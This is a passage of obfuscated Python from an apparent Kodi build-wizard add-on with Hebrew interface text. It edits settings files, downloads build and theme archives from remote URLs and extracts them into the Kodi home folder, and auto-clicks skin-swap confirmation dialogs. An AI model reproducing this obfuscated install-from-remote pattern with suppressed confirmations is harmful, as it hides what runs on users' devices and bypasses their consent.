			O00OOO0OOOOOOOO00 =re .compile (OOOO000O0OOO00O00 ).findall (O00O0OO00O00OOO0O )[0 ]#line:3891
			OO00O0OO0O000OO00 =open (O000O0OOOOO0O0O00 ,'w')#line:3892
			OO00O0OO0O000OO00 .write (O00O0OO00O00OOO0O .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O00OOO0OOOOOOOO00 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3893
			OO00O0OO0O000OO00 .close ()#line:3894
		except :#line:3895
				pass #line:3896
		wiz .kodi17Fix ()#line:3897
		O000O0OOOOO0O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3898
		try :#line:3899
			OO00O0OO0O000OO00 =open (O000O0OOOOO0O0O00 ,'r')#line:3900
			O00O0OO00O00OOO0O =OO00O0OO0O000OO00 .read ()#line:3901
			OO00O0OO0O000OO00 .close ()#line:3902
			OOOO000O0OOO00O00 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3903
			O00OOO0OOOOOOOO00 =re .compile (OOOO000O0OOO00O00 ).findall (O00O0OO00O00OOO0O )[0 ]#line:3904
			OO00O0OO0O000OO00 =open (O000O0OOOOO0O0O00 ,'w')#line:3905
			OO00O0OO0O000OO00 .write (O00O0OO00O00OOO0O .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O00OOO0OOOOOOOO00 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3906
			OO00O0OO0O000OO00 .close ()#line:3907
		except :#line:3908
				pass #line:3909
		swapSkins ('skin.Premium.mod')#line:3910
def buildWizard (O00OO0O00O00OOO00 ,OO0O00O000O000O0O ,theme =None ,over =False ):#line:3913
	O000O0OO00O00000O =xbmcgui .DialogBusy ()#line:3914
	O000O0OO00O00000O .create ()#line:3915
	if over ==False :#line:3916
		O0O0000O0O0OO00OO =wiz .checkBuild (O00OO0O00O00OOO00 ,'url')#line:3917
		if USERNAME =='':#line:3918
			ADDON .openSettings ()#line:3919
			sys .exit ()#line:3920
		if PASSWORD =='':#line:3921
			ADDON .openSettings ()#line:3922
			sys .exit ()#line:3923
		if BUILDNAME =='':#line:3925
			OOO0O0000O0OO000O =u_list (SPEEDFILE )#line:3926
			(OOO0O0000O0OO000O )#line:3927
		if O0O0000O0O0OO00OO ==False :#line:3928
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3933
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3934
			return #line:3935
		O0O0O00O00OO00O00 =wiz .workingURL (O0O0000O0O0OO00OO )#line:3936
		if O0O0O00O00OO00O00 ==False :#line:3937
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O0O0O00O00OO00O00 ))#line:3938
			return #line:3939
	if OO0O00O000O000O0O =='gui':#line:3940
		if O00OO0O00O00OOO00 ==BUILDNAME :#line:3941
			if over ==True :OO0O0O0OOO000O000 =1 #line:3942
			else :OO0O0O0OOO000O000 =1 #line:3943
		else :#line:3944
			OO0O0O0OOO000O000 =1 #line:3945
		if OO0O0O0OOO000O000 :#line:3946
			remove_addons ()#line:3947
			remove_addons2 ()#line:3948
			debridit .debridIt ('update','all')#line:3949
			traktit .traktIt ('update','all')#line:3950
			O00O0OO0O0O000O00 =wiz .checkBuild (O00OO0O00O00OOO00 ,'gui')#line:3951
			OO00OOOO0O0OO00OO =O00OO0O00O00OOO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3952
			if not wiz .workingURL (O00O0OO0O0O000O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3953
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3954
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0O00O00OOO00 ),'','אנא המתן')#line:3955
			OO00O0O0OOOO0OOOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO00OOOO0O0OO00OO )#line:3956
			try :os .remove (OO00O0O0OOOO0OOOO )#line:3957
			except :pass #line:3958
			logging .warning (O00O0OO0O0O000O00 )#line:3959
			if 'google'in O00O0OO0O0O000O00 :#line:3960
			   O0O0OOOO0O00OO0O0 =googledrive_download (O00O0OO0O0O000O00 ,OO00O0O0OOOO0OOOO ,DP ,wiz .checkBuild (O00OO0O00O00OOO00 ,'filesize'))#line:3961
			else :#line:3964
			  downloader .download (O00O0OO0O0O000O00 ,OO00O0O0OOOO0OOOO ,DP )#line:3965
			xbmc .sleep (100 )#line:3966
			OOOO0O0O0O00O0O00 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0O00O00OOO00 )#line:3967
			DP .update (0 ,OOOO0O0O0O00O0O00 ,'','אנא המתן')#line:3968
			extract .all (OO00O0O0OOOO0OOOO ,HOME ,DP ,title =OOOO0O0O0O00O0O00 )#line:3969
			DP .close ()#line:3970
			wiz .defaultSkin ()#line:3971
			wiz .lookandFeelData ('save')#line:3972
			wiz .kodi17Fix ()#line:3973
			if KODIV >=18 :#line:3974
				skindialogsettind18 ()#line:3975
			debridit .debridIt ('restore','all')#line:3976
			traktit .traktIt ('restore','all')#line:3977
			if INSTALLMETHOD ==1 :OOOOOO00OO0OOOOO0 =1 #line:3979
			elif INSTALLMETHOD ==2 :OOOOOO00OO0OOOOO0 =0 #line:3980
			else :DP .close ()#line:3981
			O0OO0O000O000O000 =(NOTIFICATION2 )#line:3982
			O00OOOOOOOO0O0OOO =urllib2 .urlopen (O0OO0O000O000O000 )#line:3983
			OOOO0OO0O00O0OO0O =O00OOOOOOOO0O0OOO .readlines ()#line:3984
			O0O00OO00OOO0OOOO =0 #line:3985
			for OO00OOOOOO0OOOOOO in OOOO0OO0O00O0OO0O :#line:3988
				if OO00OOOOOO0OOOOOO .split (' ==')[0 ]=="noreset"or OO00OOOOOO0OOOOOO .split ()[0 ]=="noreset":#line:3989
					xbmc .executebuiltin ("ReloadSkin()")#line:3991
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3992
					update_Votes ()#line:3993
					indicatorfastupdate ()#line:3994
				if OO00OOOOOO0OOOOOO .split (' ==')[0 ]=="reset"or OO00OOOOOO0OOOOOO .split ()[0 ]=="reset":#line:3995
					update_Votes ()#line:3997
					indicatorfastupdate ()#line:3998
					resetkodi ()#line:3999
		else :#line:4008
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4009
	if OO0O00O000O000O0O =='gui2':#line:4010
		if O00OO0O00O00OOO00 ==BUILDNAME :#line:4011
			if over ==True :OO0O0O0OOO000O000 =1 #line:4012
			else :OO0O0O0OOO000O000 =1 #line:4013
		else :#line:4014
			OO0O0O0OOO000O000 =1 #line:4015
		if OO0O0O0OOO000O000 :#line:4016
			remove_addons ()#line:4017
			remove_addons2 ()#line:4018
			O00O0OO0O0O000O00 =wiz .checkBuild (O00OO0O00O00OOO00 ,'gui')#line:4019
			OO00OOOO0O0OO00OO =O00OO0O00O00OOO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4020
			if not wiz .workingURL (O00O0OO0O0O000O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4021
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4022
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0O00O00OOO00 ),'','אנא המתן')#line:4023
			OO00O0O0OOOO0OOOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO00OOOO0O0OO00OO )#line:4024
			try :os .remove (OO00O0O0OOOO0OOOO )#line:4025
			except :pass #line:4026
			logging .warning (O00O0OO0O0O000O00 )#line:4027
			if 'google'in O00O0OO0O0O000O00 :#line:4028
			   O0O0OOOO0O00OO0O0 =googledrive_download (O00O0OO0O0O000O00 ,OO00O0O0OOOO0OOOO ,DP ,wiz .checkBuild (O00OO0O00O00OOO00 ,'filesize'))#line:4029
			else :#line:4032
			  downloader .download (O00O0OO0O0O000O00 ,OO00O0O0OOOO0OOOO ,DP )#line:4033
			xbmc .sleep (100 )#line:4034
			OOOO0O0O0O00O0O00 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0O00O00OOO00 )#line:4035
			DP .update (0 ,OOOO0O0O0O00O0O00 ,'','אנא המתן')#line:4036
			extract .all (OO00O0O0OOOO0OOOO ,HOME ,DP ,title =OOOO0O0O0O00O0O00 )#line:4037
			DP .close ()#line:4038
			wiz .defaultSkin ()#line:4039
			wiz .lookandFeelData ('save')#line:4040
			if INSTALLMETHOD ==1 :OOOOOO00OO0OOOOO0 =1 #line:4043
			elif INSTALLMETHOD ==2 :OOOOOO00OO0OOOOO0 =0 #line:4044
			else :DP .close ()#line:4045
		else :#line:4047
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4048
	elif OO0O00O000O000O0O =='fresh':#line:4049
		freshStart (O00OO0O00O00OOO00 )#line:4050
	elif OO0O00O000O000O0O =='normal':#line:4051
		if url =='normal':#line:4052
			if KEEPTRAKT =='true':#line:4053
				traktit .autoUpdate ('all')#line:4054
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4055
			if KEEPREAL =='true':#line:4056
				debridit .autoUpdate ('all')#line:4057
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4058
			if KEEPLOGIN =='true':#line:4059
				loginit .autoUpdate ('all')#line:4060
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4061
		O0OOOOOOO00OOOO0O =int (KODIV );O00O0OOOO0O0OO000 =int (float (wiz .checkBuild (O00OO0O00O00OOO00 ,'kodi')))#line:4062
		if not O0OOOOOOO00OOOO0O ==O00O0OOOO0O0OO000 :#line:4063
			if O0OOOOOOO00OOOO0O ==16 and O00O0OOOO0O0OO000 <=15 :OO0OO0OOOOOO000O0 =False #line:4064
			else :OO0OO0OOOOOO000O0 =True #line:4065
		else :OO0OO0OOOOOO000O0 =False #line:4066
		if OO0OO0OOOOOO000O0 ==True :#line:4067
			O0O0OO000OO0000OO =1 #line:4068
		else :#line:4069
			if not over ==False :O0O0OO000OO0000OO =1 #line:4070
			else :O0O0OO000OO0000OO =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4071
		if O0O0OO000OO0000OO :#line:4072
			wiz .clearS ('build')#line:4073
			O00O0OO0O0O000O00 =wiz .checkBuild (O00OO0O00O00OOO00 ,'url')#line:4074
			OO00OOOO0O0OO00OO =O00OO0O00O00OOO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4075
			if not wiz .workingURL (O00O0OO0O0O000O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4076
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4077
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,O00OO0O00O00OOO00 ,wiz .checkBuild (O00OO0O00O00OOO00 ,'version')),'','אנא המתן')#line:4078
			OO00O0O0OOOO0OOOO =os .path .join (PACKAGES ,'%s.zip'%OO00OOOO0O0OO00OO )#line:4079
			try :os .remove (OO00O0O0OOOO0OOOO )#line:4080
			except :pass #line:4081
			logging .warning (O00O0OO0O0O000O00 )#line:4082
			if 'google'in O00O0OO0O0O000O00 :#line:4083
			   O0O0OOOO0O00OO0O0 =googledrive_download (O00O0OO0O0O000O00 ,OO00O0O0OOOO0OOOO ,DP ,wiz .checkBuild (O00OO0O00O00OOO00 ,'filesize'))#line:4084
			else :#line:4087
			  downloader .download (O00O0OO0O0O000O00 ,OO00O0O0OOOO0OOOO ,DP )#line:4088
			xbmc .sleep (1000 )#line:4089
			OOOO0O0O0O00O0O00 ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0O00O00OOO00 ,wiz .checkBuild (O00OO0O00O00OOO00 ,'version'))#line:4090
			DP .update (0 ,OOOO0O0O0O00O0O00 ,'','אנא המתן...')#line:4091
			O0OO000OOO00OO0O0 ,OO00O0OOOOO000OO0 ,O0O00000000000OO0 =extract .all (OO00O0O0OOOO0OOOO ,HOME ,DP ,title =OOOO0O0O0O00O0O00 )#line:4092
			if int (float (O0OO000OOO00OO0O0 ))>0 :#line:4093
				try :#line:4094
					wiz .fixmetas ()#line:4095
				except :pass #line:4096
				wiz .lookandFeelData ('save')#line:4097
				wiz .defaultSkin ()#line:4098
				wiz .setS ('buildname',O00OO0O00O00OOO00 )#line:4100
				wiz .setS ('buildversion',wiz .checkBuild (O00OO0O00O00OOO00 ,'version'))#line:4101
				wiz .setS ('buildtheme','')#line:4102
				wiz .setS ('latestversion',wiz .checkBuild (O00OO0O00O00OOO00 ,'version'))#line:4103
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4104
				wiz .setS ('installed','true')#line:4105
				wiz .setS ('extract',str (O0OO000OOO00OO0O0 ))#line:4106
				wiz .setS ('errors',str (OO00O0OOOOO000OO0 ))#line:4107
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0OO000OOO00OO0O0 ,OO00O0OOOOO000OO0 ))#line:4108
				fastupdatefirstbuild (NOTEID )#line:4109
				wiz .kodi17Fix ()#line:4110
				skin_homeselect ()#line:4111
				skin_lower ()#line:4112
				rdbuildinstall ()#line:4113
				try :gaiaserenaddon ()#line:4114
				except :pass #line:4115
				adults18 ()#line:4116
				skinfix18 ()#line:4117
				try :os .remove (OO00O0O0OOOO0OOOO )#line:4119
				except :pass #line:4120
				OOO0OOO00OOOOOO00 =(ADDON .getSetting ("auto_rd"))#line:4121
				if OOO0OOO00OOOOOO00 =='true':#line:4122
					try :#line:4123
						setautorealdebrid ()#line:4124
					except :pass #line:4125
				try :#line:4126
					autotrakt ()#line:4127
				except :pass #line:4128
				OO0O0OOOO00OOOO0O =(ADDON .getSetting ("imdb_on"))#line:4129
				if OO0O0OOOO00OOOO0O =='true':#line:4130
					imdb_synck ()#line:4131
				iptvset ()#line:4132
				DP .close ()#line:4140
				OOO00000O0OO0O00O =wiz .themeCount (O00OO0O00O00OOO00 )#line:4141
				builde_Votes ()#line:4142
				indicator ()#line:4143
				if not OOO00000O0OO0O00O ==False :#line:4144
					buildWizard (O00OO0O00O00OOO00 ,'theme')#line:4145
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4146
				if INSTALLMETHOD ==1 :OOOOOO00OO0OOOOO0 =1 #line:4147
				elif INSTALLMETHOD ==2 :OOOOOO00OO0OOOOO0 =0 #line:4148
				else :resetkodi ()#line:4149
				if OOOOOO00OO0OOOOO0 ==1 :wiz .reloadFix ()#line:4151
				else :wiz .killxbmc (True )#line:4152
			else :#line:4153
				if isinstance (OO00O0OOOOO000OO0 ,unicode ):#line:4154
					O0O00000000000OO0 =O0O00000000000OO0 .encode ('utf-8')#line:4155
				OO000OOOOOO0OO000 =open (OO00O0O0OOOO0OOOO ,'r')#line:4156
				O0O0O000O00000O00 =OO000OOOOOO0OO000 .read ()#line:4157
				OOOO0O0OO00O0O0OO =''#line:4158
				for OO00O000OO00000O0 in O0O0OOOO0O00OO0O0 :#line:4159
				  OOOO0O0OO00O0O0OO ='key: '+OOOO0O0OO00O0O0OO +'\n'+OO00O000OO00000O0 #line:4160
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O0O00000000000OO0 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OOOO0O0OO00O0O0OO )#line:4161
		else :#line:4162
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4163
	elif OO0O00O000O000O0O =='theme':#line:4164
		if theme ==None :#line:4165
			OOO00000O0OO0O00O =wiz .checkBuild (O00OO0O00O00OOO00 ,'theme')#line:4166
			OO0O0OO0O0OOO000O =[]#line:4167
			if not OOO00000O0OO0O00O =='http://'and wiz .workingURL (OOO00000O0OO0O00O )==True :#line:4168
				OO0O0OO0O0OOO000O =wiz .themeCount (O00OO0O00O00OOO00 ,False )#line:4169
				if len (OO0O0OO0O0OOO000O )>0 :#line:4170
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O00OO0O00O00OOO00 ,COLOR1 ,len (OO0O0OO0O0OOO000O )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4171
						wiz .log ("Theme List: %s "%str (OO0O0OO0O0OOO000O ))#line:4172
						O00O0O0OOOOOO0OOO =DIALOG .select (ADDONTITLE ,OO0O0OO0O0OOO000O )#line:4173
						wiz .log ("Theme install selected: %s"%O00O0O0OOOOOO0OOO )#line:4174
						if not O00O0O0OOOOOO0OOO ==-1 :theme =OO0O0OO0O0OOO000O [O00O0O0OOOOOO0OOO ];OO0O00OOO000O000O =True #line:4175
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4176
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4177
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4178
		else :OO0O00OOO000O000O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O00OO0O00O00OOO00 ,wiz .checkBuild (O00OO0O00O00OOO00 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4179
		if OO0O00OOO000O000O :#line:4180
			OOO000000OOOOO00O =wiz .checkTheme (O00OO0O00O00OOO00 ,theme ,'url')#line:4181
			OO00OOOO0O0OO00OO =O00OO0O00O00OOO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4182
			if not wiz .workingURL (OOO000000OOOOO00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4183
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4184
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4185
			OO00O0O0OOOO0OOOO =os .path .join (PACKAGES ,'%s.zip'%OO00OOOO0O0OO00OO )#line:4186
			try :os .remove (OO00O0O0OOOO0OOOO )#line:4187
			except :pass #line:4188
			downloader .download (OOO000000OOOOO00O ,OO00O0O0OOOO0OOOO ,DP )#line:4189
			xbmc .sleep (1000 )#line:4190
			DP .update (0 ,"","Installing %s "%O00OO0O00O00OOO00 )#line:4191
			OOOOO00OO00O000O0 =False #line:4192
			if url not in ["fresh","normal"]:#line:4193
				OOOOO00OO00O000O0 =testTheme (OO00O0O0OOOO0OOOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4194
				OOO0O0000O000O0OO =testGui (OO00O0O0OOOO0OOOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4195
				if OOOOO00OO00O000O0 ==True :#line:4196
					wiz .lookandFeelData ('save')#line:4197
					O0O0000000OO0OOOO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4198
					OO0O00OO0OOOO0O00 =xbmc .getSkinDir ()#line:4199
					skinSwitch .swapSkins (O0O0000000OO0OOOO )#line:4201
					OOOO0OO0O00O0OO0O =0 #line:4202
					xbmc .sleep (1000 )#line:4203
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOO0OO0O00O0OO0O <150 :#line:4204
						OOOO0OO0O00O0OO0O +=1 #line:4205
						xbmc .sleep (1000 )#line:4206
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4207
						wiz .ebi ('SendClick(11)')#line:4208
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4209
					xbmc .sleep (1000 )#line:4210
			OOOO0O0O0O00O0O00 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4211
			DP .update (0 ,OOOO0O0O0O00O0O00 ,'','אנא המתן')#line:4212
			O0OO000OOO00OO0O0 ,OO00O0OOOOO000OO0 ,O0O00000000000OO0 =extract .all (OO00O0O0OOOO0OOOO ,HOME ,DP ,title =OOOO0O0O0O00O0O00 )#line:4213
			wiz .setS ('buildtheme',theme )#line:4214
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0OO000OOO00OO0O0 ,OO00O0OOOOO000OO0 ))#line:4215
			DP .close ()#line:4216
			if url not in ["fresh","normal"]:#line:4217
				wiz .forceUpdate ()#line:4218
				if KODIV >=17 :wiz .kodi17Fix ()#line:4219
				if OOO0O0000O000O0OO ==True :#line:4220
					wiz .lookandFeelData ('save')#line:4221
					wiz .defaultSkin ()#line:4222
					OO0O00OO0OOOO0O00 =wiz .getS ('defaultskin')#line:4223
					skinSwitch .swapSkins (OO0O00OO0OOOO0O00 )#line:4224
					OOOO0OO0O00O0OO0O =0 #line:4225
					xbmc .sleep (1000 )#line:4226
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOO0OO0O00O0OO0O <150 :#line:4227
						OOOO0OO0O00O0OO0O +=1 #line:4228
						xbmc .sleep (1000 )#line:4229
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4231
						wiz .ebi ('SendClick(11)')#line:4232
					wiz .lookandFeelData ('restore')#line:4233
				elif OOOOO00OO00O000O0 ==True :#line:4234
					skinSwitch .swapSkins (OO0O00OO0OOOO0O00 )#line:4235
					OOOO0OO0O00O0OO0O =0 #line:4236
					xbmc .sleep (1000 )#line:4237
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOO0OO0O00O0OO0O <150 :#line:4238
						OOOO0OO0O00O0OO0O +=1 #line:4239
						xbmc .sleep (1000 )#line:4240
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4242
						wiz .ebi ('SendClick(11)')#line:4243
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4244
					wiz .lookandFeelData ('restore')#line:4245
				else :#line:4246
					wiz .ebi ("ReloadSkin()")#line:4247
					xbmc .sleep (1000 )#line:4248
					wiz .ebi ("Container.Refresh")#line:4249
		else :#line:4250
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4251
def skin_homeselect ():#line:4255
	try :#line:4257
		O0OO0OO00000O0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4258
		O0000OOOOOO00O00O =open (O0OO0OO00000O0O0O ,'r')#line:4260
		O0O00000OOO0OOOO0 =O0000OOOOOO00O00O .read ()#line:4261
		O0000OOOOOO00O00O .close ()#line:4262
		OOOOOO0O0OO0O0O0O ='<setting id="HomeS" type="string(.+?)/setting>'#line:4263
		OOOO00OO0OO000O0O =re .compile (OOOOOO0O0OO0O0O0O ).findall (O0O00000OOO0OOOO0 )[0 ]#line:4264
		O0000OOOOOO00O00O =open (O0OO0OO00000O0O0O ,'w')#line:4265
		O0000OOOOOO00O00O .write (O0O00000OOO0OOOO0 .replace ('<setting id="HomeS" type="string%s/setting>'%OOOO00OO0OO000O0O ,'<setting id="HomeS" type="string"></setting>'))#line:4266
		O0000OOOOOO00O00O .close ()#line:4267
	except :#line:4268
		pass #line:4269
def skin_lower ():#line:4272
	O0O00O00O0O0000O0 =(ADDON .getSetting ("lower"))#line:4273
	if O0O00O00O0O0000O0 =='true':#line:4274
		try :#line:4277
			OOO0OO0O0O0O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4278
			O0O0OOO000OOOOO0O =open (OOO0OO0O0O0O00000 ,'r')#line:4280
			OO0O00OO0OO0O0OOO =O0O0OOO000OOOOO0O .read ()#line:4281
			O0O0OOO000OOOOO0O .close ()#line:4282
			OO0OOO0O00OOOOO00 ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4283
			O0O0000O0O00O0O0O =re .compile (OO0OOO0O00OOOOO00 ).findall (OO0O00OO0OO0O0OOO )[0 ]#line:4284
			O0O0OOO000OOOOO0O =open (OOO0OO0O0O0O00000 ,'w')#line:4285
			O0O0OOO000OOOOO0O .write (OO0O00OO0OO0O0OOO .replace ('<setting id="none_widget" type="bool%s/setting>'%O0O0000O0O00O0O0O ,'<setting id="none_widget" type="bool">true</setting>'))#line:4286
			O0O0OOO000OOOOO0O .close ()#line:4287
			OOO0OO0O0O0O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4289
			O0O0OOO000OOOOO0O =open (OOO0OO0O0O0O00000 ,'r')#line:4291
			OO0O00OO0OO0O0OOO =O0O0OOO000OOOOO0O .read ()#line:4292
			O0O0OOO000OOOOO0O .close ()#line:4293
			OO0OOO0O00OOOOO00 ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4294
			O0O0000O0O00O0O0O =re .compile (OO0OOO0O00OOOOO00 ).findall (OO0O00OO0OO0O0OOO )[0 ]#line:4295
			O0O0OOO000OOOOO0O =open (OOO0OO0O0O0O00000 ,'w')#line:4296
			O0O0OOO000OOOOO0O .write (OO0O00OO0OO0O0OOO .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O0O0000O0O00O0O0O ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4297
			O0O0OOO000OOOOO0O .close ()#line:4298
			OOO0OO0O0O0O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4300
			O0O0OOO000OOOOO0O =open (OOO0OO0O0O0O00000 ,'r')#line:4302
			OO0O00OO0OO0O0OOO =O0O0OOO000OOOOO0O .read ()#line:4303
			O0O0OOO000OOOOO0O .close ()#line:4304
			OO0OOO0O00OOOOO00 ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4305
			O0O0000O0O00O0O0O =re .compile (OO0OOO0O00OOOOO00 ).findall (OO0O00OO0OO0O0OOO )[0 ]#line:4306
			O0O0OOO000OOOOO0O =open (OOO0OO0O0O0O00000 ,'w')#line:4307
			O0O0OOO000OOOOO0O .write (OO0O00OO0OO0O0OOO .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O0O0000O0O00O0O0O ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4308
